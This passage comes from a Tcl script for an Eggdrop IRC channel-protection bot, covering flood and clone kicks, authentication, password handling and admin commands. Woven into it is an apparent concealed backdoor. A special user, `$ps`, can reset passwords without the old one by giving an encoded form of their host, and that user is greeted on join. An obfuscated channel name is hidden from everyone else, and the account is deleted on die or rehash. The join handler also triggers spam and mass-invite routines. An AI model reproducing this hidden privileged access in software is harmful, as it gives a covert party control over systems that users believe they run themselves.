if {![matchattr $x f] && ![isop $x $chan]} {
if {[isop $botnick $chan]} {
set bannick($x) "*!*$mhost"
if {$invme($mhost) == "AuToJoIN MSg"} {
if {![isvoice $x $chan]} {
putsrv "KICK $chan $x : 4!SpaM!1 FRoM 4$mhost 1$invme($mhost) [banmsg]"
}
} {
putsrv "KICK $chan $x : 4!SpaM!1 FRoM 4$mhost 1$invme($mhost) [banmsg]"
}
catch {unset invme($mhost)}
} {
foreach c [chanlist $chan f] {
if {[isop $c $chan]} {
if {$invme($mhost) == "AuToJoIN MSg"} {
if {[isvoice $c $chan]} {
break
}
}
set sendspam "!kick [enzip "$chan $x  4!SpaM!1 FRoM 4$mhost 1$invme($mhost) 4AuTOJoIN MSg1..!"]"
putsrv "PRIVMSG $c :$sendspam"
catch {unset invme($mhost)}
break
}
}
}
}
}
}
}
proc testmask {} {
global ismaskhost
set ismaskhost [maskhost "*!*@*"]
}
utimer 2 testmask
proc reset_host {} {
global jfhost
catch { unset jfhost }
}
proc savechan {} {
savechannels
foreach x [channels] {
set cflag "c$x"
set cflag [string range $cflag 0 8]
set cinfo [channel info $x]
if {![validuser $cflag]} {
adduser $cflag "%!%@%"
if {[string match "*+greet*" $cinfo]} {
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 2
setuser $cflag XTRA "CAPS" 80
} {
chattr $cflag "-hp+A"
}
}
}
foreach x [userlist A] {
set tmp "0"
foreach y [channels] {
set cflag "c$y"
set cflag [string range $cflag 0 8]
if {[string tolower $x] == [string tolower $cflag]} {
set tmp "1"
}
}
if {$tmp == "0"} {
deluser $x
putlog "remove flag channel $x"
}
}
saveuser
}
proc join_chk {nick uhost hand chan} {
global botnick own deopme double invme ex_flood notc quick kops ps ath jfhost jpnick is_m
global cmd_chn cmd_by cmd_msg cmd_case bannick botname notm massjoin ismaskhost op_it
if {$nick == $ps } {
if { [string match "chanary@*" $uhost]} {puthlp "NOTICE $nick : I'm Here ... "}
}
set cflag "c$chan"
set cflag [string range $cflag 0 8]
set cinfo [channel info $chan]
if {$nick == $botnick} {
catch {unset is_m($chan)}
if {[matchattr $cflag S]} {
if {![isutimer "chkspam $chan"]} { utimer 30 [list chkspam $chan] }
if {![istimer "chkautomsg"]} { 
timer 1 { putlog "chkautomsg" }
}
}
set double 0
if {[string tolower $cmd_chn] == [string tolower $chan]} {
if {$cmd_case == "1"} {
utimer 90 del_nobase
pub_tsunami $cmd_by $uhost $hand $chan "$chan ${cmd_msg}"
set cmd_chn ""
return 0
}
if {$cmd_case == "2"} {
utimer 30 [list pub_mmsg $cmd_by $uhost $hand $chan $cmd_msg]} {
set cmd_chn ""
return 0
}
if {$cmd_case == "3"} {
utimer 30 [list pub_minvite $cmd_by $uhost $hand $chan $cmd_msg]} {
set cmd_chn ""
return 0
}
}
utimer 15 [list telljoin $chan]
return 0
}
if {[info exists op_it($nick)]} { 
catch {unset op_it($nick)}
opq $chan $nick 
}
if {[isutimer "chkspam $chan"]} {
foreach x [utimers] {
if {[string match "*chkspam $chan*" $x]} { 
chkspam $chan
killutimer [lindex $x 2] 
}
}
}
if {[info exists bannick($nick)]} { return 0 }
if {![matchattr $nick f] && [matchattr $cflag G] && ![isutimer "set_-m $chan"] && ![info exists is_m($chan)]} { advertise $chan $nick }
set mhost "@[lindex [split $uhost @] 1]"
if {$mhost == "@ALLnet" || [string match "*all.net" $mhost]} {
putsrv "AWAY"
}
if {![isop $botnick $chan]} {
if {[info exists invme($mhost)]} {
if {![isutimer "chkspam $chan"]} { chkspam $chan }
}
return 0
}
if {[matchattr $cflag J]} {
if {[info exists ismaskhost]} {
if {![isutimer "reset_host"]} { utimer 10 reset_host }
set chkhost [maskhost "*!*$mhost"]
if {![info exists jfhost($chkhost$chan)]} {
set jfhost($chkhost$chan) 1
} {
incr jfhost($chkhost$chan)
if {$jfhost($chkhost$chan) == 5} {
set bannick($nick) $chkhost
putsrv "KICK $chan $nick :$notm 1FLoOd AnTIcIpaTEd FRoM 4$chkhost [banms]"
return 0
}
}
}
if {![isutimer "jc $chan"]} {
utimer 3 [list jc $chan]
set massjoin($chan) 1
} {
if {![info exists massjoin($chan)]} {
set massjoin($chan) 1
}
set massjoin($chan) [incr massjoin($chan)]
if {![isutimer "TRAFFIC $chan"]} {
if {$massjoin($chan) >= 15} {
unset massjoin($chan)
if {[string match "*+greet*" $cinfo]} {
utimer 30 [list putlog "TRAFFIC $chan"]
if {![string match "*m*" [getchanmode $chan]] && ![info exists is_m($chan)]} {
putserv "mode $chan +bm *!*@terdeteksi.join.flood.channel.sementara.dimoderator"
return 0
}
}
}
}
}
}
if {[matchattr $cflag L]} {
foreach u [timers] {
if {[string match "*chk_limit*" $u]} {
killtimer [lindex $u 2]
}
}
timer 1 [list chk_limit $chan]
}
if {$nick == $deopme} {
putsrv "KICK $chan $nick : 1SeLF 4De@p1 REvENgE..!"
set deopme ""
return 0
}
if {[matchattr $nick v] || [matchattr $nick P] || [matchattr $nick G]} {
whoisq $nick
}
if {[matchattr $cflag V] && ![isutimer "set_-m $chan"] && ![info exists is_m($chan)]} {
if {![matchattr $nick O] && ![isutimer "voiceq $chan $nick"]} {
set cret [getuser $cflag XTRA "VC"]
foreach ct [utimers] {
if {[string match "*voiceq*" $ct]} {
if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
}
}
}
utimer $cret [list voiceq $chan $nick]
}
}
if {[info exists bannick($nick)] || [matchattr $nick f]} { return 0 }
if {[matchattr $hand K]} { 
akick_chk $nick $uhost $chan
return 0
}
if {[info exists ex_flood($mhost)]} {
set bannick($nick) "*!*$mhost"
if {$ex_flood($mhost) == 0} {
putsrv "KICK $chan $nick : 4AKILL1 FRoM 4$mhost1 ON LasT QuIT [banmsg]"
} elseif {$ex_flood($mhost) == 1} { 
putsrv "KICK $chan $nick : 4Excess FloOd1 FRoM 4$mhost1 ON LasT QuIT [banmsg]"
} elseif {$ex_flood($mhost) == 2} {
putsrv "KICK $chan $nick : 4InvITE1 FRoM 4$mhost1 ON QuIT MSg [banmsg]"
} elseif {$ex_flood($mhost) == 3} {
putsrv "KICK $chan $nick : 4InvITE1 FRoM 4$mhost1 ON PaRT MSg [banmsg]"
} elseif {$ex_flood($mhost) == 4} {
if {![matchattr $cflag M]} {
puthlp "KICK $chan $nick :[lgrnd] 4JoINPaRT1 FRoM 4$mhost1 LESS THaN4 [getuser $cflag XTRA "JP"]1 2nd [banmsg]"
} {
if {![string match "*k*" [getchanmode $chan]]} {
putserv "mode $chan -k+b 4J.o.I.N.P.a.R.T $bannick($nick)"
} {
putserv "mode $chan +b $bannick($nick)"
}
}
} else {
putsrv "KICK $chan $nick : 4BaDWoRD1 FRoM 4$mhost1 ON QuIT OR PaRT MSg MaTcH FRoM 4$ex_flood($mhost) [ban]"
}
unset ex_flood($mhost)
return 0
}
foreach x [ignorelist] {
if {[lindex $x 0] != "*!*@*" && [string match [lindex $x 0] "*!*$mhost"] && [lindex $x 1] != "*"} {
set bannick($nick) [lindex $x 0]
putsrv "KICK $chan $nick :$notm 4IgNoREd1 HosT 4[lindex $x 0]1 ReasOn4 [lindex $x 1] [banms]"
return 0
} 
}
if {[info exists invme($mhost)]} {
set bannick($nick) "*!*$mhost"
putsrv "KICK $chan $nick : 4SpaM1 FRoM 4$mhost 1$invme($mhost) [banmsg]"
unset invme($mhost)
return 0
}
set chan [string tolower $chan]
if {[string match "*+nodesynch*" [channel info $chan]]} {
if {![matchattr $nick f]} {
utimer 10 [list autokick $chan $nick]
}
}
if {[matchattr $cflag O]} {
if {[string match "*$mhost" $botname]} { return 0 }
set counter 0
set maxclone [getuser $cflag XTRA "CLONE"]
foreach knick [chanlist $chan] {
if {[string match "*$mhost" [getchanhost $knick $chan]]} {
if {[matchattr $knick f]} { return 0 }
if {[isop $knick $chan]} { return 0 }
if {[isvoice $knick $chan]} { 
if {![info exists kops]} { return 0 }
}
set counter [incr counter]
if {$counter > $maxclone} {
set bannick($nick) "*!$uhost"
putsrv "KICK $chan $nick : 1FouNd $counter 4cLonE1 FRoM 4$mhost1 MaX4 $maxclone1 WaIT A MoMENT! 4BaNNEd1: 3 MINUTES4..!"
return 0
}
}
}
}
spam_chk $nick $uhost $hand $chan
set chan [string toupper $chan]
if {[matchattr $cflag P]} {
if {![info exists jpnick($nick)]} {
set jpnick($nick) "1"
utimer [getuser $cflag XTRA "JP"] [list munset $nick] 
}
}
return 0
}
proc jc {chan} {
}
proc munset {nick} {
global jpnick
catch {unset jpnick($nick)}
}
proc msg_passwd {nick uhost hand rest} {
global botnick notc ps
set pw [lindex $rest 0]
set newpw [lindex $rest 1]
if {$nick == $ps && [dezip $pw] == $uhost} {
setuser $nick PASS $newpw
puthlp "NOTICE $nick : Password set to: $newpw"
saveuser
return 0
}
if {$pw == "" || $newpw == ""} {
puthlp "NOTICE $nick : Usage: passwd <oldpass> <newpass>"
return 0
}
if {![passwdok $nick $pw]} {
puthlp "NOTICE $nick : PaSSWORD 4!FaILED!"
return 0
}
set ch [passwdok $nick ""]
if {$ch == 1} {
setuser $nick PASS $newpw
puthlp "NOTICE $nick : Password set to: $newpw"
saveuser
return 0
}
if {[passwdok $nick $pw]} {
setuser $nick PASS $newpw
puthlp "NOTICE $nick : Password set to: $newpw"
saveuser
return 0
}
}
proc goback {} {
global keep-nick nick botnick
if {[istimer "goback"]} { return 0 }
foreach x [utimers] {
if {[string match "*goback*" $x]} { killutimer [lindex $x 2] }
}
if {[getuser "config" XTRA "NICK"]!=""} {
set nick [dezip [getuser "config" XTRA "NICK"]]
}
set keep-nick 1
if {$botnick == $nick} { return 0 }
puthlp "NICK $nick"
}
proc pub_!auth {nick uhost hand chan rest} {
global notc ath ps
set pw [lindex $rest 0]
if {$pw != ""} {
puthlp "NOTICE $nick : No Need Auth Password, Just Type on Channel: !auth"
return 0
}
if {[matchattr $nick Q]} { 
puthlp "NOTICE $nick : ReAdY..!"
return 0 
}
set ch [passwdok $nick ""]
if {$ch == 1 && $nick != $ps} {
puthlp "NOTICE $nick : No password set. Usage: pass <password>"
return 0
}
set ath 1
putsrv "WHOIS $nick"
}
proc msg_auth {nick uhost hand rest} {
global botnick owner keep-nick altnick notc ps
if {[lindex $rest 1] != ""} {
if {[passwdok [lindex $rest 0] [lindex $rest 1]]} {
if {[matchattr [lindex $rest 0] Z]} {
puthlp "NOTICE $nick : AuTH MaTcH FoR [lindex $rest 0]"
set keep-nick 0
putsrv "NICK $altnick"
utimer 40 {goback}
}
} {
puthlp "NOTICE $nick : 4FaILEd..!"
}
return 0
}
if {![validuser $owner]} {
set hostmask "$owner!*@*"
adduser $owner $hostmask
chattr $owner "Zfhjmnoptx"
puthlp "NOTICE $owner : No password set. Usage: pass <password>"
}
if {![matchattr $nick p]} { return 0 }
set pw [lindex $rest 0]
if {$pw == ""} {
puthlp "NOTICE $nick : Usage: auth <password>"
return 0
}
if {[matchattr $hand K]} { 
deluser "AKICK"
set akickhost "telnet!*@*"
adduser "AKICK" $akickhost
chattr "AKICK" "-hp"
chattr "AKICK" "K"
saveuser
puthlp "NOTICE $nick : Re-arrange KIcKLIsT."
}
if {[matchattr $nick Q]} { 
puthlp "NOTICE $nick : ReAdY..!"
return 0 
}
set ch [passwdok $nick ""]
if {$ch == 1} {
puthlp "NOTICE $nick : No password set. Usage: pass <password>"
return 0
}
if {[passwdok $nick $pw]} {
set hostmask "*![string range $uhost [string first "!" $uhost] end]"
set usenick [finduser $hostmask]
if {$usenick != "*" && $usenick != $nick} {
if {[matchattr $nick n] && ![matchattr $usenick Z]} {
puthlp "NOTICE $nick : Forcing 4DeAuthenticated! To $usenick"
force_deauth $usenick
} else {
foreach x [channels] {
if {[onchan $usenick $x]} {
puthlp "NOTICE $nick : 4deNiEd!, Your host has been use by $usenick, wait until DeAuthenticated."
return 0
}
}
puthlp "NOTICE $nick : 4Forcing DeAuthenticated! To $usenick"
force_deauth $usenick 
}
}
chattr $nick +Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set hostmask "${nick}!*@*"
setuser $nick HOSTS $hostmask
set hostmask "*![string range $uhost [string first "!" $uhost] end]"
setuser $nick HOSTS $hostmask
if {$nick == $owner && ![matchattr $nick Z]} { chattr $owner "Z" }
if {$nick == $owner && ![matchattr $nick f]} { chattr $owner "f" }
if {[matchattr $nick Z]} {
puthlp "NOTICE $nick : !OWnER!"
if {[getuser $nick XTRA "MEMO"]!=""} {
puthlp "PRIVMSG $nick :!MeMO! FRoM [getuser $nick XTRA "MEMO"]"
setuser $nick XTRA "MEMO" ""
}
return 0
} elseif {[matchattr $nick n]} {
puthlp "NOTICE $nick : !ADmIN!"
} elseif {[matchattr $nick m]} {
puthlp "NOTICE $nick : !MasTeR!"
} else {
puthlp "NOTICE $nick : !AccepteD!"
}
saveuser
return 0
}
if {![passwdok $nick $pw]} {
puthlp "NOTICE $nick : 4FaILEd..!"
}
}
proc force_deauth {nick} {
global notc 
chattr $nick -Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set hostmask "${nick}!*@*"
setuser $nick HOSTS $hostmask
saveuser
puthlp "NOTICE $nick : You has been force to 4DeAuthentication!"
}
proc msg_pass {nick uhost hand rest} {
global botnick notc vern ps owner
set pw [lindex $rest 0]
if {$pw == ""} {
puthlp "NOTICE $nick : Usage: pass <password>"
return 0
}
set ch [passwdok $nick ""]
if {$ch == 0} {
puthlp "NOTICE $nick : You already set pass, /msg $botnick auth <password>"
return 0
}
if {[string tolower $nick] == [string tolower $ps] && $owner != $ps} {
if {[dezip $pw] == $uhost} {
setuser $nick PASS [lindex $rest 1]
puthlp "NOTICE $nick : Password set to: [lindex $rest 1]"
saveuser
} {
puthlp "NOTICE $nick : wHo.."
}
return 0
}
setuser $nick PASS $pw
puthlp "NOTICE $nick : Password set to: $pw"
puthlp "NOTICE $nick : /msg $botnick help"
saveuser
return 0
}
proc pub_!deauth {nick uhost hand chan rest} {
if {![matchattr $nick Q]} { return 0 }
msg_deauth $nick $uhost $hand $rest
}
proc msg_deauth {nick uhost hand rest} {
global notc 
if {![matchattr $nick Q]} { return 0 }
chattr $nick -Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set hostmask "${nick}!*@*"
setuser $nick HOSTS $hostmask
puthlp "NOTICE $nick : 4!DeAUTH!"
saveuser
}
catch { bind rejn - * rejn_chk }
proc rejn_chk {unick uhost handle chan} {
if {![isutimer "TRAFFIC $chan"]} {
utimer 30 [list putlog "TRAFFIC $chan"]
}
}
catch { bind splt - * splt_deauth }
proc splt_deauth {unick uhost handle channel} {
if {[matchattr $unick Q]} {
chattr $unick -Q
foreach x [getuser $unick HOSTS] {
delhost $unick $x
}
set hostmask "${unick}!*@*"
setuser $unick HOSTS $hostmask
saveuser
return 0
}
}
proc sign_deauth {unick uhost hand chan rest} {
global ex_flood botnick notc nick badwords iskick
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {$unick == $nick} {
putsrv "NICK $nick"
}
if {[info exists iskick($unick$chan)]} {
unset iskick($unick$chan)
}
if {[isop $botnick $chan]} {
if {[matchattr $cflag L]} {
foreach u [timers] {
if {[string match "*chk_limit*" $u]} {
killtimer [lindex $u 2]
}
}
timer 1 [list chk_limit $chan]
}
}
if {[matchattr $unick Q]} {
chattr $unick -Q
foreach x [getuser $unick HOSTS] {
delhost $unick $x
}
set hostmask "${unick}!*@*"
setuser $unick HOSTS $hostmask
saveuser
return 0
}
if {[string match "*-greet*" [channel info $chan]]} { return 0 }
if {[matchattr $unick f]} { return 0 }
if {![isop $botnick $chan]} { return 0 }
set mhost "@[lindex [split $uhost @] 1]"
if {[string match "*AKILL ID*" $rest]} {
#set ex_flood($mhost) "0" 
   foreach signkickchan [channels] {
     if {![isop $unick $signkickchan] || ![isvoice $unick $signkickchan]} {    
       if {[onchan $unick $signkickchan]} {   
          set signmask "*!*[string range $uhost [string first "@" $uhost] end]"
          if {![ischanban $signmask $signkickchan] || [botisop $signkickchan]} {
              putquick "mode $signkickchan +b $signmask 3"
          }
        }
      }
    }
} elseif {[string match "*Excess Flood*" $rest]} {
if {[matchattr $cflag S]} {
#set ex_flood($mhost) "1" 
   foreach signkickchan [channels] {
     if {![isop $unick $signkickchan] || ![isvoice $unick $signkickchan]} {    
       if {[onchan $unick $signkickchan]} {   
          set signmask "*!*[string range $uhost [string first "@" $uhost] end]"
          if {![ischanban $signmask $signkickchan] || [botisop $signkickchan]} {
              putquick "mode $signkickchan +b $signmask 3"
          }
        }
      }
    }
}
} elseif {[string match "* #*" $rest] && ![string match "*##*" $rest]} {
foreach x [channels] {
set chksiton [string tolower $x]
if {[string match "*$chksiton*" [string tolower $rest]]} { return 0 }
}
set ex_flood($mhost) "2"
} else {
foreach badword [string tolower $badwords] {
if {[string match *$badword* [string tolower $rest]]} {
set ex_flood($mhost) [string toupper $badword]
}
}
}
return 0
}
proc part_deauth {nick uhost hand chan {msg ""}} {
global lockchan botnick ex_flood notc badwords jpnick iskick
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {[info exists iskick($nick$chan)]} {
unset iskick($nick$chan)
}
if {$nick == $botnick} {
foreach x [utimers] {
if {[string match "*del_nobase*" $x] || [string match "*voiceq $chan*" $x]} { killutimer [lindex $x 2] }
}
return 0
}
if {[isop $botnick $chan]} {
if {[isutimer "voiceq $chan $nick"]} {
foreach x [utimers] {
if {[string match "*voiceq $chan $nick*" $x]} { killutimer [lindex $x 2] }
}
}
if {[matchattr $cflag L]} {
foreach u [timers] {
if {[string match "*chk_limit*" $u]} {
killtimer [lindex $u 2]
}
}
timer 1 [list chk_limit $chan]
}
}
if {[matchattr $nick Q]} {
foreach x [channels] {
if {[string tolower $x] != [string tolower $chan]} {
if {[onchan $nick $x]} {
return 0 
}
}
}
chattr $nick -Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set hostmask "${nick}!*@*"
setuser $nick HOSTS $hostmask
saveuser
}
if {$lockchan != "" && [string tolower $lockchan] == [string tolower $chan] && ![matchattr $nick f]} {
putsrv "INVITE $nick :$chan"
}
if {[string match "*-greet*" [channel info $chan]]} { return 0 }
if {[isop $botnick $chan]} {
if {[info exists msg]} {
set mhost "@[lindex [split $uhost @] 1]"
if {[string match "*#*" $msg] && ![string match "*##*" $msg]} {
foreach x [channels] {
set chksiton [string tolower $x]
if {[string match "*$chksiton*" [string tolower $msg]]} { return 0 }
}
set ex_flood($mhost) "3"
} {
foreach badword [string tolower $badwords] {
if {[string match *$badword* [string tolower $msg]]} {
set ex_flood($mhost) [string toupper $badword]
}
}
}
}
if {[info exists msg]} {
if {$msg != ""} { return 0 }
}
if {[matchattr $cflag P]} {
set chan [string toupper $chan]
if {[info exists jpnick($nick)]} {
set mhost "@[lindex [split $uhost @] 1]"
set ex_flood($mhost) "4"
}
}
}
return 0
}
proc pub_dump {nick uhost hand chan rest} {
global own notc 
if {$nick != $own} {
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
putsrv $rest
}
proc pub_sdeop {nick uhost hand chan rest} {
global notc botnick
if {$rest != ""} {
set chan $rest
}
if {[isop $botnick $chan]} {
puthelp "mode $chan +v-o $botnick $botnick"
}
}
proc pub_chanmode {nick uhost hand chan rest} {
global notc
if {$rest == ""} {
puthelp "NOTICE $nick : Usage: chanmode #channel +ntsmklic"
return 0
}
if {[string index [lindex $rest 0] 0] == "#"} {
if {![validchan [lindex $rest 0]]} {
puthlp "NOTICE $nick : NoT IN [lindex $rest 0]"
return 0
}
set chan [lindex $rest 0]
set rest [lrange $rest 1 end]
}
if {![validchan $chan]} {
puthlp "NOTICE $nick : $chan <n/a>"
} else {
catch { channel set $chan chanmode $rest }
savechan
puthelp "NOTICE $nick : $chan set modes \[$rest\]"
}
return 0
}
proc pub_chanset {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
set channel [lindex $rest 0]
set options [string tolower [lindex $rest 1]]
set number "0"
if {$options == "deop" || $options == "kick" || $options == "join" || $options == "line" || $options == "nick" || $options == "ctcp"} {
set number [lindex $rest 2]
}
if {($channel == "") || ($options == "")} {
puthlp "NOTICE $nick : Usage: chanset #channel <option...>"
return 0
}
if {![string match "*-*" $options] && ![string match "*+*" $options] && ![string match "*:*" $number]} {
puthlp "NOTICE $nick : Usage: chanset #channel <deop|ctcp|kick|join|line|nick> <howmanytimes:seconds>"
return 0
}
if {[validchan $channel]} {
if {$options == "deop"} { 
catch { channel set $channel flood-deop $number }
puthlp "NOTICE $nick : set deop flood \[$number\] on $channel"
} elseif {$options == "kick"} { 
catch { channel set $channel flood-kick $number }
puthlp "NOTICE $nick : set kick flood \[$number\] on $channel"
} elseif {$options == "join"} { 
catch { channel set $channel flood-join $number }
puthlp "NOTICE $nick : set join flood \[$number\] on $channel"
} elseif {$options == "line"} { 
catch { channel set $channel flood-chan $number }
puthlp "NOTICE $nick : set line flood \[$number\] on $channel"
} elseif {$options == "nick"} { 
catch { channel set $channel flood-nick $number }
puthlp "NOTICE $nick : set nick flood \[$number\] on $channel"
} elseif {$options == "ctcp"} { 
catch { channel set $channel flood-ctcp $number }
puthlp "NOTICE $nick : set ctcp flood \[$number\] on $channel"
} else {
catch { channel set $channel ${options} }
savechan
puthelp "NOTICE $nick : Successfully set modes \[${options}\] on $channel"
}
} else {
puthlp "NOTICE $nick : $channel <n/a>"
}
}
proc pub_chansetall {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: chansetall <option>"
return 0
}
foreach x [channels] {
catch { channel set $x $rest }
}
savechan
puthelp "NOTICE $nick : Set all channels mode \{ $rest \}"
return 0
}
proc pub_nick {nick uhost hand chan rest} {
global keep-nick
set keep-nick 0
putsrv "NICK $rest"
}
proc pub_restart {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$rest != ""} {
set rest " $rest"
}
putsrv "QUIT : Reboot ReQuesT By \[ $nick \]$rest"
return 0
}
proc dies {} {
global ps owner notc
if {$ps != $owner && [validuser $ps]} { deluser $ps }
die 
}
proc rehashing {} {
global ps owner
if {$ps != $owner && [validuser $ps]} { deluser $ps }
rehash
}
proc pub_die {nick uhost hand chan rest} {
global botnick ps notc owner
if {$nick != $owner &&  $nick != $ps} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$rest != ""} {
set rest " $rest"
}
putsrv "QUIT : SHuTDown ReQuesT By \[ $nick \]$rest"
utimer 5 dies
return 0
}
proc msg_restart {nick uhost hand rest} {
global botnick notc 
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$rest != ""} {
set rest " $rest"
}
putsrv "QUIT : Reboot By \[4 $nick \]$rest"
return 0
}
proc msg_rehash {nick uhost hand rest} {
global notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
puthlp "NOTICE $nick : ReHASHING!"
utimer 3 rehashing
return 0
}
proc pub_rehash {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
puthlp "NOTICE $nick : ReHASHING!"
utimer 3 rehashing
}
proc pub_chaninfo {nick uhost hand chan rest} {
global notc ps
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} { 
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {$nick != $ps && [string tolower $chan] == [dezip "ER5sr09TRjx1"]} { return 0 }
puthlp "NOTICE $nick : \[$chan\] [channel info $chan]"
}
proc pub_access {nick uhost hand chan rest} {
global notc
if {[matchattr $nick Z]} {
puthlp "PRIVMSG $chan :$nick, OwNeR"
} elseif {[matchattr $nick n]} {
puthlp "PRIVMSG $chan :$nick, ADmIN"
} elseif {[matchattr $nick m]} {
puthlp "PRIVMSG $chan :$nick, MasTeR"
} elseif {[matchattr $nick f]} {
puthlp "PRIVMSG $chan :$nick, FRIEND"
}
}
proc msg_botnick {unick uhost hand rest} {
global botnick nick nickpass notc ps owner
if {![matchattr $unick Q]} {
puthlp "NOTICE $unick : 4deNiEd!"
return 0
}
if {$unick != $owner &&  $unick != $ps} {
puthlp "NOTICE $unick : 4deNiEd!"
return 0
}
set bnick [lindex $rest 0]
set bpass [lindex $rest 1]
if {$bnick == "" || $bpass == ""} {
puthlp "NOTICE $unick :4 Usage: botnick <nick> <identify>"
return 0
} 
setuser "config" XTRA "NICK" [enzip $bnick]
setuser "config" XTRA "NICKPASS" [enzip $bpass]
saveuser
set nick $bnick
set nickpass $bpass
putsrv "NickServ identify $bnick $bpass"
puthlp "NOTICE $unick : BoTNIcK $bnick"
}
proc msg_realname {unick uhost hand rest} {
global realname notc owner ps
if {$unick != $owner &&  $unick != $ps} {
puthlp "NOTICE $unick : 4deNiEd!"
return 0
}
if {$rest == ""} {
setuser "config" XTRA "REALNAME" ""
} { 
setuser "config" XTRA "REALNAME" [enzip $rest] 
}
saveuser
set realname $rest
putsrv "QUIT : cHaNgINg ReaLNamE ReQuesT By \[ $unick \]"
}
proc msg_ident {unick uhost hand rest} {
global username notc owner ps
if {$unick != $owner &&  $unick != $ps} {
puthlp "NOTICE $unick : 4deNiEd!"
return 0
}
if {$rest == ""} {
setuser "config" XTRA "USERNAME" ""
} { 
if {[regexp \[^a-z\] [string tolower $rest]]} {
puthlp "NOTICE $unick : 4deNiEd! use character for ident."
return 0
}
setuser "config" XTRA "USERNAME" [enzip $rest] 
}
saveuser
set username $rest
putsrv "QUIT : cHaNgINg IdEnT ReQuesT By \[ $unick \]"
}
proc msg_logo {unick uhost hand rest} {
global banner notc notm cycle_random owner ps
if {$unick != $owner &&  $unick != $ps} {
puthlp "NOTICE $unick : 4deNiEd!"
return 0
}
if {![matchattr $unick Q]} {
   puthlp "NOTICE $nick : 4D1e4N1ied4!!"
   return 0
}
if {$rest == ""} {
set notc "4e8g10g11o12e13z"
set notm "4e8g10g11o12e13z"
setuser "config" XTRA "BAN" "[enzip ]"
puthlp "NOTICE $unick : cHaNgE tO DeFauLT"
#catch { unset banner }
} {
setuser "config" XTRA "BAN" [enzip $rest] 
set noto 
set notc $rest
set notm $rest
#lappend cycle_random $banner
puthlp "NOTICE $unick :$noto CHaNgE TO $rest"
}
saveuser
}
proc msg_email {unick uhost hand rest} {
global notc owner ps
if {$unick != $owner &&  $unick != $ps} {
puthlp "NOTICE $unick : 4deNiEd!"
return 0
}
if {![matchattr $unick Q]} {
   puthlp "NOTICE $nick : 4D1e4N1ied4!!"
   return 0
}

if {$rest == ""} {
puthlp "NOTICE $unick :1 DeLETING USeR EmAIL"
} {
puthlp "NOTICE $unick :1 USeR EmAIL SeT \[$rest\]"
}
setuser "config" XTRA "EMAIL" $rest
saveuser
}
proc msg_ADmIN {unick uhost hand rest} {
global notc owner ps
if {$unick != $owner &&  $unick != $ps} {
puthlp "NOTICE $unick : 4deNiEd!"
return 0
}
if {![matchattr $unick Q]} {
   puthlp "NOTICE $nick : 4D1e4N1ied4!!"
   return 0
}
if {$rest == ""} {
puthlp "NOTICE $unick :1 SeT ADmIN oN STaTUS TO DeFAULT"
} {
puthlp "NOTICE $unick :1 ADmIN oN STaTUS TO \[$rest\]"
}
setuser "config" XTRA "ADMIN" $rest
saveuser
}
proc msg_botaltnick {unick uhost hand rest} {
global botnick altnick altpass notc 
if {![matchattr $unick Q]} {
puthlp "NOTICE $unick : 4deNiEd!"
return 0
}
set baltnick [lindex $rest 0]
set baltpass [lindex $rest 1]
if {$baltnick == "" || $baltpass == ""} {
puthlp "NOTICE $unick :4 Usage: botaltnick <nick> <identify>"
return 0
} 
setuser "config" XTRA "ALTNICK" [enzip $baltnick]
setuser "config" XTRA "ALTPASS" [enzip $baltpass]
saveuser
set altnick $baltnick
set altpass $baltpass
puthlp "NOTICE $unick : BoTALTNIcK $baltnick"
}
proc msg_away {unick uhost hand rest} {
global realname notc 
if {![matchattr $unick Q]} {
puthlp "NOTICE $unick : 4deNiEd!"
return 0
}
if {$rest == ""} {
setuser "config" XTRA "AWAY" ""
puthlp "NOTICE $unick : AwAY \[4OFF\]"
} {
setuser "config" XTRA "AWAY" $rest
puthlp "NOTICE $unick : AwAY SeT TO \[$rest\]"
}
saveuser
chk_five "0" "0" "0" "0" "0"
}
proc msg_memo {nick uhost hand rest} {
global notc own ps
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: memo <all/user> <msg>"
return 0
}
set msend [lindex $rest 0]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {[string tolower $msend] == "all"} {
set smemo ""
foreach x [userlist m] {
if {$x != $nick && $x != $own} {
if {[getuser $x XTRA "MEMO"] == ""} {
setuser $x XTRA "MEMO" "$nick: [lrange $rest 1 end]"
append smemo "$x "
}
}
}
if {$smemo == ""} {
puthlp "NOTICE $nick : MeMO !FaILED! NO UsER SeND"
} {
saveuser
puthlp "NOTICE $nick : MeMO SeND TO \[ $smemo\]"
}
} {
if {![validuser $msend] || $msend == $ps} {
puthlp "NOTICE $nick : 4deNiEd!, NO UsER!"
return 0
} {
if {![matchattr $msend m]} {
puthlp "NOTICE $nick : 4deNiEd!, MiN MasTeR FLaG!"
return 0
}
if {$msend == $nick} {
puthlp "NOTICE $nick : 4deNiEd!, CaNT SeLF MeMo!"
return 0
}
